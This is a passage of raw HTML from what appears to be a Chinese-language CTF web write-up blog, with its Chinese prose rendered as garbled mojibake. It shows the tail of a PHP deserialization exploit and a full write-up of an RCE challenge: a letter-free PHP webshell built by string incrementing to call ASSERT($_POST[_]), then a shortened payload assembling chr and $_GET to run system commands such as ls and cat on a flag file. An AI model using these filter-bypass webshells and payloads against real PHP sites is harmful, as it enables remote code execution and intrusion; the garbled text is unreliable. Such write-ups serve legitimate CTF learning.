class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$ee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$ee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="comment">//$easy-&gt;cla=$copy_ee;</span></span><br><span class="line"><span class="comment">//$sec-&gt;var[0]=$ee;ä¿®æ”¹ä¸ºvarï¼Œå»æ‰æ•°ç»„[]ã€‚ä¸ºä»€ä¹ˆè¿™æ ·ä¿®æ”¹ï¼Œæˆ‘æš‚æ—¶è¿˜ä¸å¤ªæ¸…æ¥šï¼Œä»¥åäº†è§£äº†ï¼Œä¼šå›æ¥æ›´æ–°çš„</span></span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>=<span class="variable">$ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>)));</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ï¼Œä¸ºä»€ä¹ˆ<code>$easy-&gt;cla=$copy_ee;</code>åˆ é™¤æ‰ï¼Œæˆ‘çš„ç†è§£æ˜¯è¦æƒ³è®©eeeeç±»ä¸­__clone()å‡½æ•°è§¦å‘ï¼Œåªéœ€è¦eeeeç±»è¢«å…‹éš†å°±OKäº†ï¼Œå°±æ˜¯è®©Easyç±»ä¸­çš„$var&#x3D;$eeeeç±»ï¼Œè€Œä¸ç”¨å†å®šä¹‰Easyä¸­çš„claå±æ€§ã€‚</p>
<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/3.png"></p>
<p>æœ€åï¼Œç¼–å†™çš„expå¯ä»¥è¿è¡Œï¼Œä¼ å…¥åå¾—åˆ°flag</p>
<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/4.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/19/NSWSTAR-week2-UnserializeOne/" data-id="cl9hxo4hk000z20v4ddtv4uux" data-title="NSWSTAR-week2-UnserializeOne" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NSSCTF-HNCTF-Week1-Challenge-rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/" class="article-date">
  <time class="dt-published" datetime="2022-10-16T14:42:58.000Z" itemprop="datePublished">2022-10-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/">NSSCTF-HNCTF-[Week1]Challenge__rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥åˆ†æé¢˜ç›®ã€‚</p>
<p>è¿›å…¥é¢˜ç›®ï¼Œå‘ç°ä¸€ä¸ªæç¤ºï¼Œ</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/0.png"></p>
<p>æ—¢ç„¶çµæ„Ÿæ˜¯æ¥è‡ªctfshouåƒç“œæ¯ï¼Œé‚£ä¹ˆåƒç“œæ¯çš„è§£é¢˜æ€è·¯ä¹Ÿåº”è¯¥é€‚ç”¨æœ¬é¢˜ï¼Œå…ˆè¿›å…¥é¶æœºçœ‹ä¸‹é¢˜ç›®ï¼Œå‘ç°ä¸€ç‰‡ç©ºç™½ï¼Œ</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/1.png"></p>
<p>è‡ªç„¶å…ˆæŒ‰F12çœ‹æºç é‡Œæœ‰æ²¡æœ‰æç¤ºä¿¡æ¯ï¼Œå‘ç°?hintï¼Œ</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/2.png"></p>
<p>è¯•ç€ç”¨GETä¼ ä¸€ä¸ªhint&#x3D;1å‚æ•°ï¼Œæäº¤åå‡ºç°æºç ï¼Œæ˜¯ä¸€ä¸ªRCEï¼Œ</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/4.png"></p>
<p>åˆ†æä¸‹å°±æ˜¯ç”¨POSTä¼ ä¸€ä¸ªrceå‚æ•°ï¼Œä½†æ˜¯é•¿åº¦ä¸èƒ½è¶…è¿‡120ï¼Œè€Œä¸”åˆè¿‡æ»¤äº†å…¨éƒ¨å­—æ¯ï¼Œä»¥åŠå¤§å¤šæ•°ç¬¦å·ï¼Œçœ‹ä¸‹æœ€åèƒ½ç”¨çš„å­—ç¬¦åªæœ‰</p>
<p>0-9ï¼Œ$ã€_ã€[]ã€{}è¿™äº›å­—ç¬¦ã€‚åªç”¨æ— å­—ç¬¦å’‹èƒ½RCEå•Šï¼Ÿæ²¡ä»€ä¹ˆæ€è·¯ï¼Œçœ‹ä¸‹é¢˜ç›®é‚£é‡Œçš„æç¤ºï¼ŒCTFshowåƒç“œæ¯ï¼Œç™¾åº¦æœä¸‹writeupï¼Œ</p>
<p>å‘ç°äº†ä¸€ç¯‡pç¥å†™çš„æ— æ•°å­—å­—ç¬¦çš„webshellçš„åšå®¢ï¼Œ<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p>æ€»ç»“ä¸‹æ–‡ç« ä¸»è¦å†…å®¹ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ï¼Œ å¦‚ä½•ç¼–å†™ä¸€ä¸ªä¸ä½¿ç”¨æ•°å­—å’Œå­—æ¯çš„webshellï¼Ÿ</span><br><span class="line">    </span><br><span class="line">é¦–å…ˆï¼Œæ˜ç¡®æ€è·¯ã€‚æˆ‘çš„æ ¸å¿ƒæ€è·¯æ˜¯ï¼Œå°†éå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢ï¼Œæœ€åèƒ½æ„é€ å‡ºa-zä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ç„¶åå†åˆ©ç”¨PHPå…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œçš„</span><br><span class="line">ç‰¹ç‚¹ï¼Œæ‹¼æ¥å¤„ä¸€ä¸ªå‡½æ•°åï¼Œå¦‚â€œassertâ€ï¼Œç„¶ååŠ¨æ€æ‰§è¡Œä¹‹å³å¯ã€‚</span><br><span class="line">æœ‰ä¸‰ä¸ªæ–¹æ³•ï¼Œå¼‚æˆ–ï¼Œå–åï¼Œè‡ªå¢ï¼Œæœ¬é¢˜ä½¿ç”¨çš„æ˜¯ç¬¬ä¸‰ä¸ªæ–¹æ³•ï¼Œå‰ä¸¤ä¸ªæ–¹æ³•ä¸ºä»€ä¹ˆç”¨ä¸äº†ï¼Œæ–‡ç« é‡Œæœ‰è¯´æ˜ã€‚</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>ï¼Œ æ–¹æ³•ä¸‰çš„ä¸»è¦åŸç†æ˜¯ï¼Œ</span><br><span class="line">    </span><br><span class="line">åœ¨å¤„ç†å­—ç¬¦å˜é‡çš„ç®—æ•°è¿ç®—æ—¶ï¼ŒPHP æ²¿è¢­äº† Perl çš„ä¹ æƒ¯ï¼Œè€Œé C çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨ Perl ä¸­ <span class="variable">$a</span> = <span class="string">&#x27;Z&#x27;</span>; <span class="variable">$a</span>++; å°†æŠŠ <span class="variable">$a</span> å˜æˆ<span class="string">&#x27;AA&#x27;</span>ï¼Œè€Œåœ¨ C </span><br><span class="line">ä¸­ï¼Œa = <span class="string">&#x27;Z&#x27;</span>; a++; å°†æŠŠ a å˜æˆ <span class="string">&#x27;[&#x27;</span>ï¼ˆ<span class="string">&#x27;Z&#x27;</span> çš„ ASCII å€¼æ˜¯ <span class="number">90</span>ï¼Œ<span class="string">&#x27;[&#x27;</span> çš„ ASCII å€¼æ˜¯ <span class="number">91</span>ï¼‰ã€‚æ³¨æ„å­—ç¬¦å˜é‡åªèƒ½é€’</span><br><span class="line">å¢ï¼Œä¸èƒ½é€’å‡ï¼Œå¹¶ä¸”åªæ”¯æŒçº¯å­—æ¯ï¼ˆa-z å’Œ A-Zï¼‰ã€‚é€’å¢ï¼é€’å‡å…¶ä»–å­—ç¬¦å˜é‡åˆ™æ— æ•ˆï¼ŒåŸå­—ç¬¦ä¸²æ²¡æœ‰å˜åŒ–ã€‚</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´ï¼Œ<span class="string">&#x27;a&#x27;</span>++ =&gt; <span class="string">&#x27;b&#x27;</span>ï¼Œ<span class="string">&#x27;b&#x27;</span>++ =&gt; <span class="string">&#x27;c&#x27;</span>... æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸ºaï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—a-zä¸­æ‰€æœ‰å­—ç¬¦ã€‚</span><br><span class="line">é‚£ä¹ˆï¼Œå¦‚ä½•æ‹¿åˆ°ä¸€ä¸ªå€¼ä¸ºå­—ç¬¦ä¸²<span class="string">&#x27;a&#x27;</span>çš„å˜é‡å‘¢ï¼Ÿ</span><br><span class="line">å·§äº†ï¼Œæ•°ç»„ï¼ˆArrayï¼‰çš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™Aï¼Œè€Œä¸”ç¬¬<span class="number">4</span>ä¸ªå­—æ¯æ˜¯å°å†™aã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶æ‹¿åˆ°å°å†™å’Œå¤§å†™Aï¼Œç­‰äºæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°a-zå’ŒA-</span><br><span class="line">Zçš„æ‰€æœ‰å­—æ¯ã€‚åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸ºArrayï¼š</span><br><span class="line">å†å–è¿™ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå°±å¯ä»¥è·å¾—<span class="string">&#x27;A&#x27;</span>äº†ã€‚ç„¶ååˆ©ç”¨é€’å¢ï¼Œå¯ä»¥è·å–A-Zæ‰€æœ‰å­—ç¬¦</span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>,  åˆ©ç”¨è¿™ä¸ªæŠ€å·§ï¼Œæˆ‘ç¼–å†™äº†å¦‚ä¸‹å‘½ä»¤ä¸º<span class="title function_ invoke__">ASSERT</span>(<span class="variable">$_POST</span>[]);çš„webshellï¼ˆå› ä¸ºPHPå‡½æ•°æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆæ‰§è¡Œçš„æ˜¯ï¼Œæ— éœ€è·å–å°å†™aï¼‰</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ€è·¯å¯¹æœ¬é¢˜æ¥è¯´æ˜¯æ­£ç¡®çš„ï¼Œä½†å†™æœ¬é¢˜çš„webshellè¿˜éœ€ä¸€äº›æ›´æ”¹ï¼Œæ¯”å¦‚åšå®¢é‡Œè·å–Arrayæ˜¯é€šè¿‡@.â€[]â€å¾—åˆ°çš„ï¼Œä½†æ˜¯æœ¬é¢˜çš„@æ˜¯è¢«è¿‡æ»¤äº†ï¼Œ$æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç è·å–å­—ç¬¦A </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_=$;$_=$_.[];//æ­¤æ—¶çš„$_ä¸ºArray</span><br><span class="line">$__=$_[0]//$__ä¸ºA </span><br><span class="line"></span><br><span class="line">ç”±äºå‚æ•°rceæœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½çš„ç®€åŒ–ä»£ç ï¼Œ</span><br><span class="line"></span><br><span class="line">ä¸Šé¢çš„ä»£ç å¯ä»¥ç®€åŒ–ä¸º</span><br><span class="line">$_.=[];//ä¸ç”¨å®šä¹‰$_=$ï¼Œç›´æ¥åªç”¨.æ‹¼æ¥[],æ­¤æ—¶$_ä¸ºArray</span><br><span class="line">$_=$_[0];//$_ä¸ºA</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿˜éœ€è¦äº†è§£PHP å‰è‡ªå¢åŠ å’Œåè‡ªå¢åŠ çš„åŒºåˆ«ï¼Œç™¾åº¦ç»“æœå¦‚ä¸‹ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">å‰è‡ªå¢åŠ ï¼š</span><br><span class="line"></span><br><span class="line">$b = 1;</span><br><span class="line">$a = ++$b;       //æ­¤è¯­å¥ç­‰åŒäºï¼š $b=$b+1; $a=$bï¼›</span><br><span class="line">echo &#x27;$a=&#x27;.$a;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;$b=&#x27;.$b;</span><br><span class="line">è§£é‡Šï¼šå‰é€’å¢++$b,æŠŠ$bçš„å€¼å¢åŠ äº†1åå†è¿”å›ç»™$bå’Œ$a</span><br><span class="line">ç»“æœï¼š</span><br><span class="line">$a=2</span><br><span class="line">$b=2</span><br><span class="line"> </span><br><span class="line">åè‡ªå¢åŠ ï¼š</span><br><span class="line">$b = 1;</span><br><span class="line">$a = $b++;      // æ­¤è¯­å¥ç­‰åŒäºï¼š $a=$b; $b=$b+1ï¼›</span><br><span class="line">echo &#x27;$a=&#x27;.$a;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;$b=&#x27;.$b;</span><br><span class="line">ç»“æœï¼š</span><br><span class="line">$a=1</span><br><span class="line">$b=2</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€æ¬¡å†™çš„payloadä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>.=[];<span class="comment">//$_ä¸ºArray</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">1</span>];<span class="comment">//$__ä¸ºr</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">3</span>];<span class="comment">//$_ä¸ºa</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_0</span>=<span class="variable">$_</span>++;<span class="comment">//$_0ä¸ºcï¼Œ$_ä¸ºd</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//$_ä¸ºg</span></span><br><span class="line"><span class="variable">$_1</span>=++<span class="variable">$_</span>;<span class="comment">//$_ã€$_1ä¸ºh</span></span><br><span class="line"><span class="variable">$_3</span>=<span class="variable">$_0</span>.<span class="variable">$_1</span>.<span class="variable">$__</span>[<span class="number">1</span>];<span class="comment">//$_3ä¸ºchr</span></span><br><span class="line"><span class="variable">$_4</span>=_.<span class="variable">$_3</span>(<span class="number">71</span>).<span class="variable">$_3</span>(<span class="number">69</span>).<span class="variable">$_3</span>(<span class="number">84</span>);<span class="comment">//åˆ©ç”¨phpçš„chrå‡½æ•°å¾—åˆ°_GETå­—ç¬¦</span></span><br><span class="line">(<span class="variable">$$_4</span>[<span class="number">1</span>])(<span class="variable">$$_4</span>[<span class="number">2</span>]);<span class="comment">//æ‹¼æ¥å¾—åˆ°($_GET[1])($_GET[2])</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯URLç¼–ç åæäº¤ï¼Œä¼šæ˜¾ç¤ºtoo long!</p>
<p>é‚£ä¹ˆè¿˜éœ€è¦ç®€åŒ–ä¸‹payloadã€‚</p>
<p>è§‚å¯Ÿä¸‹ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨æŠŠ</p>
<p><code>$_1=++$_;//$_ã€$_1ä¸ºh $_3=$_0.$_1.$__[1];//$_3ä¸ºchr</code></p>
<p>åˆå¹¶èµ·æ¥ï¼Œå¹¶ä¸”å¼€å§‹çš„    <code>$__=$_[1];//$__ä¸ºr</code>   å¯ä»¥åˆ é™¤ï¼Œç„¶åä¸ä¸Šé¢çš„åˆå¹¶ã€‚</p>
<p>æ€»çš„æ¥è¯´å°±æ˜¯åˆ©ç”¨<strong>åè‡ªå¢åŠ </strong> ç„¶åå°†$_å˜ä¸ºhæ—¶ï¼Œç„¶åç›´æ¥æ‹¼æ¥æˆchrå­—ç¬¦ã€‚</p>
<p>åˆå¹¶åä»£ç ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>.=[];<span class="comment">//$__ä¸ç”¨å®šä¹‰ä¸º$ï¼Œæœ€åä¸º$__ä¸ºArrayï¼Œ</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>[<span class="number">3</span>];<span class="comment">//$_ä¸ºa</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_0</span>=<span class="variable">$_</span>++;<span class="comment">//$_å¼€å§‹ä¸ºcï¼Œç„¶åå…ˆèµ‹å€¼ç»™$_0ï¼Œç„¶åå†è‡ªå¢ä¸ºd</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//è¿™æ—¶çš„$_ä¸ºg</span></span><br><span class="line"><span class="variable">$_0</span>.=++<span class="variable">$_</span>.<span class="variable">$__</span>[<span class="number">1</span>];<span class="comment">//$_å¼€å§‹ä¸ºgï¼Œç„¶åè‡ªå¢ä¸ºhï¼Œ$__[]ä¸ºå¼€å§‹çš„Arrayï¼Œæ²¡æœ‰å˜,é‚£ä¹ˆ$__[1]ä¸ºrã€‚$_0ä¸ºcï¼Œæ‹¼æ¥å$_0ä¸ºchr</span></span><br><span class="line"><span class="variable">$_4</span>=_.<span class="variable">$_0</span>(<span class="number">71</span>).<span class="variable">$_0</span>(<span class="number">69</span>).<span class="variable">$_0</span>(<span class="number">84</span>);<span class="comment">//$_4ä¸º_GET</span></span><br><span class="line">(<span class="variable">$$_4</span>[<span class="number">1</span>])(<span class="variable">$$_4</span>[<span class="number">2</span>]);<span class="comment">//($_GET[1])($_GET[2])</span></span><br></pre></td></tr></table></figure>

<p>ç”¨GETæäº¤?hint&#x3D;1&amp;1&#x3D;system&amp;2&#x3D;lsï¼Œpayloadé€šè¿‡POSTç„¶åç»URLç¼–ç ï¼Œæäº¤å‘ç°lså‘½ä»¤æ‰§è¡ŒæˆåŠŸ</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/5.png"></p>
<p>æ¥ä¸‹æ¥ä¾æ¬¡æ‰§è¡Œls &#x2F;</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/6.png"></p>
<p>æœ€åç›´æ¥cat &#x2F;ffflllaaagggï¼Œæ‰¾åˆ°flag</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/7.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/" data-id="cl9hxo4hj000x20v4acu660ff" data-title="NSSCTF-HNCTF-[Week1]Challenge__rce" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-SSRF-ç«¯å£æ‰«æ" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" class="article-date">
